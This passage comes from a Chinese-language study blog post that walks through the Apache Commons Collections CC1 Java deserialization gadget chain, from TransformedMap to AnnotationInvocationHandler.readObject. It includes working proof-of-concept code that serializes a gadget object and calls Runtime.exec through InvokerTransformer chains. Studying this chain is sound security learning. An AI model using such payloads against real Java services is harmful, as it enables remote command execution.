class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">transformerMapClass</span> <span class="hljs-operator">=</span> TransformedMap.class;<br>        <span class="hljs-comment">//TransformedMap.class返回TransformedMap类的Class对象。我们可以使用这个Class对象来访问和操作TransformedMap类的相关信息。</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformerMapClass.getDeclaredMethod(<span class="hljs-string">"checkSetValue"</span>, Object.class);<br>        <span class="hljs-comment">//使用transformedMapClass对象来获取TransformedMap类的checkSetValue方法。</span><br>        <span class="hljs-comment">//因为checkSetValue是peotected,所以需要使用etAccessible(true)改变其作用域,这样即使私有的方法,也可以访问调用了</span><br>        checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//参数：1、调用方法的对象实例，2、要传递给方法的参数</span><br>        checkSetValueMethod.invoke(decorateMap, r);<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319211618831.png" alt="image-20240319211618831"></p>
<blockquote>
<p>这里先理一下思路（先不管Map，HashMap的由来）首先我们是找到了调用了transform方法的类TransformedMap，接着我们进入该类继续分析，发现checkSetValue方法的<code>valueTransformer.transform(value);</code>调用与我们最开始的demo相同，只需要将valueTransformer替换为InvokerTransformer即可。</p>
<p>那既然我们想要调用checkSetValue方法，就需要看该方法所属类的构造函数了，接着分析其对应的构造函数发现存在对valueTransformer的赋值，这意味着valueTransformer我们可控了。但这时候发现都是protected的权限，这时候需要寻找内部是否存在实例化该类的方法，结果发现decorate静态方法，且为public权限，这意味着我们直接调用即可构造完整利用链</p>
</blockquote>
<p>接下来就是寻找哪里调用了decorate方法，这里找到如下图的地方，但这个类是没用的（这里是文章说的，我还不懂，先往下分析）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319214340416.png" alt="image-20240319214340416"></p>
<p>既然找不到合适的，所以我们把目光再放回之前的 checkSetValue 方法，去找哪里调用了该方法。 这里我们同样查找用法(Alt+F7)，发现只有一个地方调用了checkSetValue方法： AbstractInputCheckedMapDecorator 类的 setValue</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319214806627.png" alt="image-20240319214806627"></p>
<h3 id="AbstractInputCheckedMapDecorator-MapEntry-setValue">AbstractInputCheckedMapDecorator.MapEntry.setValue</h3>
<p>仔细观察也会发现，AbstractInputCheckedMapDecorator类为TransformedMap的父类</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319215021073.png" alt="image-20240319215021073"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319215043521.png" alt="image-20240319215043521"></p>
<p>Entry代表的是Map中的一个键值对，而对Map中我们可以看到setValue方法，我们在对Map进行遍历的时候可以调用setValue这个方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319215534888.png" alt="image-20240319215534888"></p>
<p>不过上面这个MapEntry类实际上是重写了setValue方法，看他继承的父类AbstractMapEntryDecorator，其中也含有setValue方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319215747641.png" alt="image-20240319215747641"></p>
<p>而这个类又引入了Map.Entry接口，所以我们只需要进行常规的Map遍历，就可以调用setValue方法，然后水到渠成的调用checkSetValue方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319220004178.png" alt="image-20240319220004178"></p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.javafx.collections.MappingChange;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.invoke.MethodHandle;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> javax.swing.text.html.ObjectView;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException {<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<span class="hljs-comment">//实例化一个HashMap</span><br>        map.put(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>);<span class="hljs-comment">//给map一个键值对，方便后续的遍历</span><br><br>        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-comment">//用于遍历 decorateMap 中的每个 Entry 对象。在每次迭代中，将当前的 Entry 对象赋值给变量entry。每个 Entry 对象表示一个键值对，其中包括键和对应的值。</span><br>        <span class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet()){<span class="hljs-comment">//decorateMap是一个Map对象，entrySet() 方法返回一个包含 Map 中键值对（Entry）的集合。</span><br>            entry.setValue(r);<span class="hljs-comment">//调用setvalue方法，设置Entry对象的值为r</span><br>        }<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>decorateMap 之前的东西和之前都一样，不再讲述，区别是我们这里遍历了 decorateMap 来触发 setValue 。（注意 map.put(“key”,“value”) ，要不然map里面没东西，后面进不去for循环）</p>
<p>decorateMap 是 TransformedMap 类的，该类没有再实现 entrySet 方法，所以会调用父类的 entrySet 方法。故在for循环时会进入如下方法：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319221654043.png" alt="image-20240319221654043"></p>
<p>这里会先判断isSetValueChecking()，如果判断通过即可过得一个EntrySet实例，而我们的 isSetValueChecking() 是恒返回true的，所以也就无所谓，直接返回实例。 所以我们的 entry 在这里也是来自 AbstractInputCheckedMapDecorator 类的，所以后面才可以调到 setValue 方法。效果如下：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSetValueChecking</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//恒为true</span><br>    }<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319221324912.png" alt="image-20240319221324912"></p>
<p>隔了一天了，再来梳理一下上述链子的思路：</p>
<p>首先我们在TransformedMap类下，想要调用的是checkSetValue方法（但是protected权限），接着我们想的是直接利用该类本身带有的decorate方法来实例化类，进一步调用checkSetValue方法，但对于decorate来讲，没能找到调用该方法的链子（发现走不通）。于是我们接着查看checkSetValue方法被谁调用过。</p>
<p>发现只有一个类调用了该方法：AbstractInputCheckedMapDecorator类下的setValue方法，仔细观察会发现该方法包含在一个MapEntry类中，且继承自父类AbstractMapEntryDecorator，我们跟踪该类会发现该类还实现了Map.Entry接口中的方法，我们先观察当前类，发现该类也含有一个setValue方法，这意味着AbstractInputCheckedMapDecorator类下的setValue是对AbstractMapEntryDecorator类中对应的方法的重写。</p>
<p>接着我们跟踪Map.Entry接口，会发现该接口中含有setValue方法，且以键值对的形式存在，这意味着如果我们对Map对象调用entrySet方法，进行遍历即可得到setValue方法，而该方法已经被重写过了，也就能完整的形成调用链</p>
<p>而对于上述有一个小问题：就是我们经过遍历得到的setValue方法，是被AbstractMapEntryDecorator类实现的，但是该类的子类<br>
AbstractInputCheckedMapDecorator对其父类的setValue方法进行了重写，那这个时候调用的应该是父类的setValue还是子类的setValue方法呢？（这里给出GPT的答案）</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">通过 `<span class="hljs-built_in">entrySet</span>()` 方法获取到的 `Map<span class="hljs-selector-class">.Entry</span>` 对象，调用的是具体条目对象的 `<span class="hljs-built_in">setValue</span>()` 方法，而具体条目对象是实现类的实例。<br><br>如果具体条目对象的 `<span class="hljs-built_in">setValue</span>()` 方法在子类中被重写（覆盖），那么通过 `<span class="hljs-built_in">entrySet</span>()` 方法获取到的 `Map<span class="hljs-selector-class">.Entry</span>` 对象调用的就是子类中重写后的 `<span class="hljs-built_in">setValue</span>()` 方法，而不是父类的方法。<br><br>这符合面向对象的多态性原则，即通过父类的引用调用子类的方法时，实际执行的是子类中重写后的方法。<br><br>例如，如果你使用的是 `HashMap` 类作为 `Map` 的实现类，并且在子类中有一个名为 `MyEntry` 的具体条目类，覆盖了 `<span class="hljs-built_in">setValue</span>()` 方法，那么通过 `<span class="hljs-built_in">entrySet</span>()` 方法获取到的 `Map<span class="hljs-selector-class">.Entry</span>` 对象调用的就是 `MyEntry` 类中重写后的 `<span class="hljs-built_in">setValue</span>()` 方法。<br><br>总结来说，通过 `<span class="hljs-built_in">entrySet</span>()` 方法获取到的 `Map<span class="hljs-selector-class">.Entry</span>` 对象调用的是具体条目对象的 `<span class="hljs-built_in">setValue</span>()` 方法，如果该方法在子类中被重写，那么调用的就是子类中重写后的方法。<br></code></pre></td></tr></tbody></table></figure>
<p>那我们接着分析，现如今找到了setValue方法，接下来就是继续看谁调用了该方法，并且可以被我们继续所利用构造出合适的链子</p>
<p>这里经过文章的分析，找到了AnnotationInvocationHandler类，且该类中还含有readObject方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320203713236.png" alt="image-20240320203713236"></p>
<p>进一步观察代码会发现，其中的for语句已经完美的替换掉了我们上述遍历Map对象的处理</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320203842897.png" alt="image-20240320203842897"></p>
<h3 id="AnnotationInvocationHandler-readObject">AnnotationInvocationHandler.readObject</h3>
<p>这里我们找到了 AnnotationInvocationHandler 中的 readObject 方法，接下来跟着文章分析一下这段代码</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这是一个私有方法，用于反序列化对象。它接受一个 ObjectInputStream 类型的参数 s，用于读取对象的序列化数据。</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException {<br>    <span class="hljs-comment">//使用 ObjectInputStream 的 defaultReadObject() 方法从输入流中读取对象的默认数据。这是为了保证默认的反序列化行为。</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br>		<span class="hljs-comment">//这是一个自定义的类型，用于表示注解类型</span><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> {<br>            annotationType = AnnotationType.getInstance(type);<br>        } <span class="hljs-keyword">catch</span>(IllegalArgumentException e) {<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">"Non-annotation type in annotation serial stream"</span>);<br>        }<br>		<br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-comment">//使用 for 循环遍历 memberValues.entrySet()，将每个键值对赋值给memberValue</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            <span class="hljs-comment">//根据成员名从memberTypes中获取对应的成员类型</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-comment">//获取当前循环迭代的值（成员值）</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-comment">//判断成员值是否与成员类型兼容</span><br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) {<br>              <span class="hljs-comment">//如果成员值不兼容，将会创建一个新的AnnotationTypeMismatchExceptionProxy对象，并将其设置为对应的成员值</span><br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">"["</span> + value + <span class="hljs-string">"]"</span>).setMember(<br>                                annotationType.members().get(name)));<br>                }<br>            }<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>可以看到这里再调用setValue前面还要经过两个判断，这里再看一下memberValues是如何传入的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320205227434.png" alt="image-20240320205227434"></p>
<p>如上图，这里看到是在构造函数中传入memberValues形参对应的值，这里可以知道memberValues是可控的，只需要在构造函数的时候传入memberValues即可。且这里的构造函数的修饰符是默认的</p>
<blockquote>
<p>我们知道在 Java 中，如果在构造函数的定义中没有指定修饰符（如 public 、 private 、 protected 或者默认的包级私有），那么该构造函数将具有默认的包级私有访问修饰符。默认的包级私有访问修饰符意味着该构造函数可以在同一个包中的其他类中访问和调用，但在不同包中的类中是不可见的。</p>
</blockquote>
<p>也就是说这个构造函数只能在sun.reflect.annotation包下被调用，如果我们想要在外部调用，就需要利用反射。这里结合前面，我们可以再次写出利用代码</p>
<h4 id="测试代码2">测试代码2</h4>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.javafx.collections.MappingChange;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.invoke.MethodHandle;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> javax.swing.text.html.ObjectView;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>);<br><br>        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>, invokerTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class, decorateMap);<br>        serialize(obj);  <span class="hljs-comment">//序列化</span><br>        unserialize(<span class="hljs-string">"D:\\JavaStudy\\JavaCC1\\src\\main\\java\\Cc1.ser"</span>); <span class="hljs-comment">//反序列化</span><br><br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"D:\\JavaStudy\\JavaCC1\\src\\main\\java\\Cc1.ser"</span>));<br>        oos.writeObject(object);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        objectInputStream.readObject();<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>但这里我们在运行之后，并没有弹出计算器</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320211200505.png" alt="image-20240320211200505"></p>
<h4 id="问题1">问题1</h4>
<p>调试看看，断点设在AnnotationInvocationHandler.readObject()之前说的两个判断处：进行调试运行</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320211533023.png" alt="image-20240320211533023"></p>
<p>在这里如果我们点击步过的话，会直接调到下面，说明我们没有进去if判断语句。这里判断memberType，但是我们的memberType正好为空。</p>
<p>memberType来自memberTypes，memberTypes来自annotationType，annotationType 来自 type （ annotationType = AnnotationType.getInstance(type); ）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320212145165.png" alt="image-20240320212145165"></p>
<p>而Type来自我们传入的构造函数的参数</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320212228532.png" alt="image-20240320212228532"></p>
<p>我们这里的要求传入的注解参数，是要求有成员变量的，并且成员变量要和 map 里面的 key 对的上。<br>
（ ! (memberType.isInstance(value) ）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320212402361.png" alt="image-20240320212402361"></p>
<p>但是我们之前使用的Override注解没有成员变量，所以不行</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320212656442.png" alt="image-20240320212656442"></p>
<p>这里我们找到了SuppressWarnings注解，该注解有一个成员变量：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320213014379.png" alt="image-20240320213014379"></p>
<p>于是我们可以修改我们的代码：（这里暂时不知道为何要修改map这一处代码）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320213047165.png" alt="image-20240320213047165"></p>
<h4 id="问题2">问题2</h4>
<p>改完之后接着运行，发现报错，这里说找不到对应的exec方法，看到上述Runtime类的对象r也是灰色的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320213202898.png" alt="image-20240320213202898"></p>
<p>同时我们可以看到，readObject 方法里面 setValue 的参数的实例居然是写死的，根本没用办法利用</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240320213415756.png" alt="image-20240320213415756"></p>
<h3 id="解决无法传入runtime的问题">解决无法传入runtime的问题</h3>
<p>在解决这个问题的时候，文章看的我很疑惑，我不理解他们如何找到的那些类，这里看了个b站的视频，有所收获，这里就先跟着文章走一波，走完之后在总体回顾一下选择这些类的思路。</p>
<p>这里找到文章所说类的原因大概率是前期准备的工作，我们可以直接拿出那两个关键类来分析一波</p>
<h4 id="ChainedTransformer">ChainedTransformer</h4>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240321211229155.png" alt="image-20240321211229155"></p>
<p>我们对transForm方法继续看看谁调用了，这里找到上图的类发现很有趣的地方，首先这个类ChainedTransformer接受一个Transformer[]数组赋值给一个变量。</p>
<p>接着在transform方法中，接受一个Object对象，然后调用iTransformers数组中的每个元素（实际上代表着转换器），然后调用每个转换器的transform方法，传入Object对象，并将返回值更新为新的转换结果，供以后得iTransformers数组元素调用</p>
<p>至于我们会想到使用上述类的原因在于这里</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240321211939437.png" alt="image-20240321211939437"></p>
<p>如上图，这里的Runtime我们跟进一下就知道该类没有继承serialize接口，因此不能被反序列化，但如果我们跟进一下Runtime的原型Class。如下图，会发现该类含有Serializable接口，能进行反序列化</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240321212229522.png" alt="image-20240321212229522"></p>
<p>那我们需要先利用反射获取Class原型，payload如下</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) method.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">"exec"</span>, String.class);<br>        execMethod.invoke(runtime, <span class="hljs-string">"calc"</span>);<br></code></pre></td></tr></tbody></table></figure>
<p>现在我们结合transform方法来实现上述代码</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        Class clazz = Class.forName("java.lang.Runtime");</span><br><span class="hljs-comment">//        Method method = clazz.getMethod("getRuntime", null);</span><br><span class="hljs-comment">//        Runtime runtime = (Runtime) method.invoke(null,null);</span><br><span class="hljs-comment">//        Method execMethod = clazz.getMethod("exec", String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(runtime, "calc");</span><br><br><span class="hljs-comment">//第一段就是为了获取getRuntime方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class,Class[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>,<span class="hljs-literal">null</span>}).transform(Runtime.class);<br><span class="hljs-comment">//第二段是为了执行getRuntime方法，获取Runtime对象</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class,Object[].class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>}).transform(getRuntimeMethod);<br><span class="hljs-comment">//通过Runtime对象执行exec方法</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}).transform(runtime);<br></code></pre></td></tr></tbody></table></figure>
<p>上面代码写的时候很懵逼，也是看了视频加很多文章才大概懂了知道如何写，主要还是理解了InvokerTransformer构造函数以及transform方之间的联系，就比较好懂为何是上面这种写法了。</p>
<p>下面是对Runtime.class与Runtime.class.getClass方法之间区别的回答，但可以看到这两个没有区别。</p>
